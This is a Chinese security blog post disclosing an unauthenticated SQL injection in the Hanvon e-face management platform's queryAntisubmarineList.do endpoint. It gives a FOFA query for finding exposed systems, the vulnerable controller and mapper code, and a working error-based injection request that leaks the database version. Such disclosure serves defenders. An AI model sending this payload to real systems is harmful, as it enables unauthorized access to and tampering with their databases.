---
title: "汉王e脸通综合管理平台 queryAntisubmarineList.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryAntisubmarineList-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-queryantisubmarinelist.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 queryAntisubmarineList.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/14 12:20
* 998浏览
* [0评论](#comment)
* 27分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryAntisubmarineList.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `AntisubmarineController` 里关于 `queryAntisubmarineList` 的实现

```
@RequestMapping(
        value = {"queryAntisubmarineList.do"},
        method = {RequestMethod.GET}
    )
    @ResponseBody
    public RequestJson queryAntisubmarineList(@RequestParam(required = false) Integer page, @RequestParam(required = false) Integer pageSize, @RequestParam(required = false) String key, @RequestParam(required = false) String order, @RequestParam(required = false) String columnKey) {
        RequestJson result = new RequestJson();
        if (page == null) {
            page = Constants.DEFAULT_START_PAGE_INDEX;
        }

        if (pageSize == null) {
            pageSize = Constants.PAGE_SIZE;
        }

        PageHelper.startPage(page, pageSize);

        try {
            AntiStealthyParams record = new AntiStealthyParams();
            record.setKey(key);
            record.setColumnKey(columnKey);
            record.setOrder(order);
            List<AntiStealthyVO> antiStealthyVOList = this.antisubmarineAsm.queryAntiStealthyList(record);
            PageInfo<AntiStealthyVO> info = new PageInfo(antiStealthyVOList);
            result.setObj(info);
```

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 AccessAntisubmarineDao.xml

代码安全审计

```
<select id="queryAntiStealthyList" resultMap="BaseResultMap2">
    select anti.*,dbi.SZ_NAME AS DEVICE_NAME from ACCESS_ANTI_SUBMARINE anti
    left join DEV_DEVICE dbi on dbi.NG_ID = anti.CONTROL_INFO_ID
    where anti.STATE != 1
    AND dbi.nt_state = 1
    <if test="key !=null and key != '' ">
      and dbi.SZ_NAME like CONCAT('%',#{key},'%')
    </if>
    <if test="controlInfoId !=null and controlInfoId != '' ">
      and dbi.NG_ID = #{controlInfoId}
    </if>
    order by
    <if test="order == null or order == ''">
      dbi.ts_last_active desc
    </if>
    <if test="order != null and order != ''">
      ${columnKey} ${order}
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/antisubmarine/queryAntisubmarineList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 queryAntisubmarineList.do SQL注入漏洞](images/img-001-e7dcbbd0a429.webp)](https://image.mrxn.net/ff80c2384685419ebe9e536cb0e87aa0.webp)

成功利用报错注入获取到数据库版本号

漏洞预警服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 queryAntisubmarineList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryAntisubmarineList-sqli.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-queryAntisubmarineList-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALV0lEQVR4Aeyc3XrbthJFtfr+73xOJrtLAoaAKLuJpQv6K7K5f2YIYyjHct3+c7vd/ved9b9/P16t/Td+uNerujnR+8pH3Hnq4lizujYnrjKldV/+HayB/Kq7/vmUE7gP5Nekb6+s3cat1ZeLwA3QviPwWzcnGugc5ry5Qlh78Fyv2lqQHAR394b4EKza1bL+DMfa+0BG8bp+3wkcBgKZOsz43S1C+rxaD+s8RPdpsx9EB+6v8O5ZA8nKRfOiOqzz+ubPENIHZlzVHQayCl3az53Afx6ITwtk+q9u3ToRUt85RLcvzNx8oRmxtFryjpBeEKxsrbNc96umVte/w//zQL5z06tmfwJ/bCD1hIwL1k+dGYjftwZrfZeD5GGP1u7urW5OVBfVxZ2u/x38YwP5zs2vmuMJHAbi1DseS6PA4sn8pcV9/Gm/h/L86iyvv8LeGeY99hqIbx2suXUw+9bt0LqOq/xhIKvQpf3cCdwHApk6PMfd1py+vhzSTx3Cuy8313HnQ/oBveTwvsQewO+fDhwKvinAuh9Eh+c43vY+kFG8rt93Av/41HwV+5YhT4E6zFxdhNmH59y6juO+uwfrntbs8l/1e17+HbxeIX0qb+aHgUCeKpjRfUJ0ubh7GvRhXacv9j7qHSH94Ig9+2pP62Duab1+R5jzMPOv5A8D6cUX/9kT+AfW09w9FeqQOrnbhujyM+z15mHuAzPf1VlfuMvA3Kuytcx3LO/ZMt8zO93cyr9eIZ7Oh+D2uyz316cI66cLopuHmav3vjDnuj/w+/uK6rXTy3NBesOM3e8c5ny/F8RXh3D7iBB9l4PZr9z1CqlT+KB1+DsEjlMb9+v01SD5rncOyVm3Q5hzvU+vg+ThgWasFdUhWXUI1xf15WLX5ZA+EOy63D4rvF4hq1N5o3YYSJ8iZNowozkR4vfPBda6OevlHSH1ENSHmat/BSE9+h7kEB9m9B4w69Z1Xx3Wef3Cw0BsduF7TuA+kJpOLcgUd9upTC2Yc6XVgrVuv8rUksOcVxcrOy71ZwjpCTOOferaHpBcabXU63pc6h3N7HRIf/1dvvz7QIpc6/0nsB0IzFN1qzDrEA7BPn2Ibn3Hnu8+pB5mtG5Ea9V2/EyH+V49D/HVYebeH6LLRetESA64bQdyuz7ecgLbgfRpynfo7iHTlvc8zL45mHWYuX3Mi5AcPH5zEaKZESE6BH/rv/6wN0SX/7KW/+x8SL1F5iA6BPVFc4XbgRi+8GdP4P6zLJinB+E1tVoQDjO63crUkosw5ytTq/ul1VKv63FB+qiZe4a7rDqkJwTVe0+ID8HuWyfqQ/LqYvflhdcrpE7hg9Z9IE5P7HtU7wh5Cnq+c+sgeQiag3Bz6uKZXj6khzUiRK9MLfW6Hhckp9/RrLocUgdBfRGiw4zWmyu8D6TItd5/Aqc/7YVM1a3CzJ0yzDqEd18u2rdzdRHSD/ZoVoRk5SJEh6B630PnMOdh5uZh1u0v9hwkD1zvQ24f9nH4kuX0OrpvdXhMFR7vAcyJkJx16qI6JKcuQnRz6qL6MzQLcy9rIDqs0dyuj/oZ9j7yEQ8DOWt6+X/3BLYDgflpcRsQXS7CWnf6EB+CZ3X6He3X9Ve4tTDvodeaU4fneXMDTpe7fnDsux3I1PEiP3YC93fq3hEytd1Uuy4X7bPj6jDfR916iC/vaB6SA3rkwIHfv/VurQG5qN5RX9SXQ/p3XS6aF9ULr1dIncIHrfv7kNW0VvuE+SmAcAj2PhAdZuy9Ib5676MOyUFQvRCiwYzl1eo9IbnyakE4BEur9WpdZccF6QPB0atriA4PvF4hdTIftF4eiE9JRz8XdTlk6uqifkd9SJ2+ulxUX+EuA89726vXy8/Q+o5ndaP/8kDGouv6753A4bssp7u7JcxP2S7X+0Dqdrp9dj6k3pwI0QGlOwK/v6uCoAaEwxp3OXURUi8XYa2/4l+vEE/pQ/AayIcMwm0cBgKPl5uhEfuXlNGra5jrYeaVGZf9YM7BzMea8dr6wlGv69JeWZWttcuWNy5zozZen/lmV7nDQAxf+J4TuL8xhPmJhDWH6BB02zBzdXH1NJQHqdOHmatXdlyQHBxxzNU1JFPX44LX9L4HSN1Oh/gQHO9Z19ZBfHnh9QqpE/qgdRhITWlc7nXU6vpM199h9ajV/dJqQZ4e/dJWS/8VhPSEYO9nD3VITh3C9dU7dr9z8yv9MBDDF77nBE4H0qcIeUp22zUP6xxEh6D53k8dkoMZzZtbIaRm5ZVmjzOE9DEH4RBUr5615B0heZhxzJ0OZAxf13//BF4eCGSq9QTU6luD+F2vbC1Y+xAdgtbDzNWrVy35iJAaCI5eXcNaL+8rq+6/Wr2HmZ2uD9kXcP0a0O3DPg4/XOz7g0yvT/OM9z7mb7c48o5xb9P/JGDM6IuQ/cHxV5GsMyvCowb21+btI8JcYw5mHcL1rZfD7Jf+8pesCl/r75/AfSBOD+apqbuVztVhrlMXIX6vh+g91zkkBzOaWyEkq9fvfabrw7qP/eC5b59X8D6QV8JX5u+fwP1nWa/eCvI0QNA6nxZ5x53fdTm81t98Yb9n5/C8Z/VYrV0fWPeD6PAce9/i1yukTuGD1va7LMh0+159gtTlsM7DWre+I6zzMOvet9cX7x6sa2HWq3ZcMPsQbv+OEH/sUdfm6nq19AuvV8jqhN6onQ4E5qlDeE2zFoT3z6G8WuqQHATVRYheNePS7wjJjzpEg6B9xsx43X1IHQS7L4f4MOPYe7yG5KwXzUB84Hqnfvuwj8N3WX167hcyxe5/l0P6QdD7dOz99dUh9fB4p65nVlSH1KhDuL6oL4fkut65+Y7mxO4XP/2SZfGFP3MC9++yINOHYE2rVt8GxFeH8MrW6jqsfXNVMy51EVIvNytfIaQGgr1GDrMP4b0nRLdOhOg9L4f4EOx658D1d8jtwz4OX7LOpq/fPw/IUwDBr/rmYa73fiLMvnVfQVj38B72gjkHMzcvQnwI2kdf3lG/8DCQHr74z57AdiA1rXG5Lcj0IThm6tpcXdfqvLRa6pA+8o4QH4LdX/HqX6t7sO4B0WHG6rFaMOcgvN/PWogPQXMQDg/cDsSiC3/2BA4Dgce0gPtunHZHA8DvX/3v3PxO14e53rxoTg7P8+YKYc7aS6xMrc5LGxd8rQ+s82PPuva+hYeBVOBa7zuBwzt1t1LTqiUXYZ46hFe2ljkR4st3WLW1ul9ara6vOOReEDRT9eNSh+T0IPzhh0PQ3M7vulyEdR/9wusVUqfwQev+Tt3pi7s9fteHPB27vhDf/hAOM1pvboU9A+mhLloL8eX6HSE59Z6XdzzL6xder5A6hQ9a979DINOH19DPwadBDqlXF/XPEOZ687s+kDxg9I7A9J2fBkSHYNf7veQdresIc199mHUIhwderxBP60PwPpA+/R3f7RsyZX2Yuf30RZhz6uKurvuVUxNLG1fX5aJZyJ7k+hAdZtQXe91ONzfifSAWXfjeEzgMBObpQ/hum/DffJ+Os/4w3wfC4Yi9FySjDjN3DzDru7x6R0g9zHiWG/3DQEbzuv75E/hjA/Ep81OQi5CnRh/CIahufsfVRfMj6ol6MN9Lv2PPy83JO+58dbHXQfYFXP/G8PZhH3/sFQKZstP384To8u6r7xBSb13HVZ0ZPUgP+RnCOm9fiA/B3g+iQ7DXmYf48sI/NpBqdq3/fgKHgTjNjrtbvZrb1avbB/LUQFAfwiG40yE+YGT7X2P1e8o72giY3vmb0/8qruoPA/lq0yv/Z0/gPhDI9OE5nt0e5vr+FEB8dRGi9/76XYfk9VfYazqHuQeEwxp39V13L12Xw9xfvfA+kCLXev8JXAN5/wymHfwfAAD//6OS25IAAAAGSURBVAMAb7f+yAq24h8AAAAASUVORK5CYII=)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-queryAntisubmarineList-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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